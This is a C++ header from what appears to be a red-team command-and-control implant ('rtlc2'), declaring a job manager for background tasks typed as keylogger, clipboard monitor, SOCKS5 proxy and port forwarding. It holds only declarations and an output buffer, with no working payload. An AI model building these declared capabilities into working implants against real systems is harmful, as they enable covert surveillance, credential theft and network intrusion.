#pragma once
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <thread>
#include <atomic>
#include <functional>
#include <ctime>

namespace rtlc2 {

enum class JobType : int {
    Keylogger = 0,
    Socks5,
    PortForward,
    ClipboardMonitor,
    ReversePortForward,
};

struct JobInfo {
    std::string id;
    JobType type;
    std::string description;
    std::time_t startTime;
    std::atomic<bool> running{true};
    std::mutex outputMu;
    std::string output;          // ring buffer (last 64KB)
    static constexpr size_t kMaxOutput = 65536;

    void AppendOutput(const std::string& data) {
        std::lock_guard<std::mutex> lock(outputMu);
        output += data;
        if (output.size() > kMaxOutput) {
            output = output.substr(output.size() - kMaxOutput);
        }
    }

    std::string GetOutput() {
        std::lock_guard<std::mutex> lock(outputMu);
        return output;
    }
};

class JobManager {
public:
    JobManager() = default;
    ~JobManager() { StopAll(); }

    // Start a new background job; returns job ID
    std::string StartJob(JobType type, const std::string& description,
                         std::function<void(JobInfo&)> fn);

    // Stop a running job by ID
    bool StopJob(const std::string& jobId);

    // Stop all running jobs
    void StopAll();

    // List active jobs
    std::vector<std::pair<std::string, std::string>> ListJobs();

    // Get output from a specific job
    std::string GetJobOutput(const std::string& jobId);

    // Format job list as readable string
    std::string FormatJobList();

private:
    std::mutex mu_;
    std::map<std::string, std::shared_ptr<JobInfo>> jobs_;
    std::map<std::string, std::thread> threads_;

    std::string generateId();
};

} // namespace rtlc2
